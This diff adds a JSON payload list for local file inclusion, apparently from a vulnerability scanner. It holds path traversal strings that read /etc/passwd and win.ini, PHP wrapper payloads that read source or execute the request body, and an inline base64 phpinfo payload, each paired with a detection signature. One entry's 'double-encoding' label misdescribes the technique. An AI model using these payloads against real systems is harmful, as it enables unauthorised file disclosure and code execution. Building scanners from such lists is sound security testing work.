@@ -1,0 +1,22 @@
+{
+  "family": "lfi",
+  "version": "1.0.0",
+  "categories": {
+    "linux": [
+      {"payload": "../../../../etc/passwd",          "signature": "root:[x*]:0:0", "confidence_hint": 95},
+      {"payload": "../../../../../../etc/passwd",    "signature": "root:[x*]:0:0", "confidence_hint": 95},
+      {"payload": "/etc/passwd",                     "signature": "root:[x*]:0:0", "confidence_hint": 80},
+      {"payload": "....//....//....//etc/passwd",    "signature": "root:[x*]:0:0", "confidence_hint": 85, "description": "Double-encoding bypass"}
+    ],
+    "windows": [
+      {"payload": "..\\..\\..\\..\\windows\\win.ini",    "signature": "\\[fonts\\]", "confidence_hint": 95},
+      {"payload": "../../../../../../windows/win.ini",   "signature": "\\[fonts\\]", "confidence_hint": 95},
+      {"payload": "C:\\Windows\\win.ini",                "signature": "\\[fonts\\]", "confidence_hint": 80}
+    ],
+    "php_wrappers": [
+      {"payload": "php://filter/convert.base64-encode/resource=index", "signature": "PD9waHA|^\\?php", "confidence_hint": 90, "description": "Read PHP source as base64"},
+      {"payload": "php://input",                                       "signature": "",          "confidence_hint": 70, "description": "Read POST body as code"},
+      {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "signature": "phpinfo", "confidence_hint": 85, "description": "Inline PHP"}
+    ]
+  }
+}
